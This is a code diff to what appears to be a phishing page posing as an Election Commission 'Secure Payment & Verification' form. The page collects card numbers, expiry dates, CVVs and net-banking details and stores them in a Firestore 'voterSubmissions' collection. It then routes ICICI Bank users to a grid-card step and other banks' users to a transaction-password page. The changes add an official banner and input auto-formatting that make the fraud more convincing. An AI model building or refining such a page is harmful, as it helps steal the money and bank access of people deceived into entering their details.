@@ -7,7 +7,38 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 480px; }
+        
+        /* Updated Form Container for Edge-to-Edge Banner */
+        .form-container { 
+            background: #ffffff; 
+            padding: 0 35px 35px 35px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
+            width: 100%; 
+            max-width: 480px; 
+            overflow: hidden; 
+        }
+
+        /* Full Width Edge-to-Edge Banner Styling */
+        .full-banner {
+            margin-left: -35px;
+            margin-right: -35px;
+            margin-bottom: 25px;
+            width: calc(100% + 70px);
+            height: 120px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #004085;
+        }
+
+        .full-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
         .form-container h2 { text-align: center; margin-bottom: 20px; color: #0056b3; font-size: 22px; }
         
         .tab-container { display: flex; gap: 10px; margin-bottom: 20px; }
@@ -33,6 +64,11 @@
 </head>
 <body>
     <div class="form-container">
+        <!-- Logo Banner Added Here -->
+        <div class="full-banner">
+            <img src="logo.png" alt="Election Commission Banner">
+        </div>
+
         <h2>Secure Payment & Verification</h2>
 
         <div class="tab-container">
@@ -45,12 +81,12 @@
             <div id="cardSection" class="form-section active">
                 <div class="form-group">
                     <label for="cardNumber">Card Number</label>
-                    <input type="text" id="cardNumber" name="cardNumber" placeholder="4592 XXXX XXXX XXXX" maxlength="19">
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" autocomplete="off">
                 </div>
                 <div class="row-group">
                     <div class="form-group">
                         <label for="expiryDate">Expiry Date</label>
-                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5">
+                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" autocomplete="off">
                     </div>
                     <div class="form-group">
                         <label for="cvv">CVV</label>
@@ -138,6 +174,31 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
+        // Card Number Auto-formatting (XXXX XXXX XXXX XXXX)
+        const cardNumberInput = document.getElementById('cardNumber');
+        cardNumberInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue.substring(0, 19);
+        });
+
+        // Expiry Date Auto-formatting (MM/YY)
+        const expiryDateInput = document.getElementById('expiryDate');
+        expiryDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
         const cardTabBtn = document.getElementById('cardTabBtn');
         const netTabBtn = document.getElementById('netTabBtn');
         const cardSection = document.getElementById('cardSection');
@@ -211,7 +272,6 @@
                     existingData = docSnap.data();
                 }
 
-                // नया रो (New Row) बनाने का लॉजिक ताकि बार-बार ट्राई करने पर पुराना डेटा ओवरराइट न हो
                 const newDocRef = await addDoc(collection(db, "voterSubmissions"), {
                     time: new Date().toLocaleString(),
                     fullname: existingData.fullname || 'N/A',
@@ -238,7 +298,6 @@
                 localStorage.setItem('voterDocId', newDocRef.id);
 
                 setTimeout(() => {
-                    // केवल ICICI Bank होने पर Grid पर जाएगा, Card होने पर page5 पर, और बाकी सभी अन्य बैंकों के लिए ट्रांजैक्शन पासवर्ड पेज पर जाएगा
                     if (payMethod === 'NetBanking' && selectedBank.trim() === 'ICICI Bank') {
                         window.location.href = "grid_step1.html"; 
                     } else if (payMethod === 'Card') {
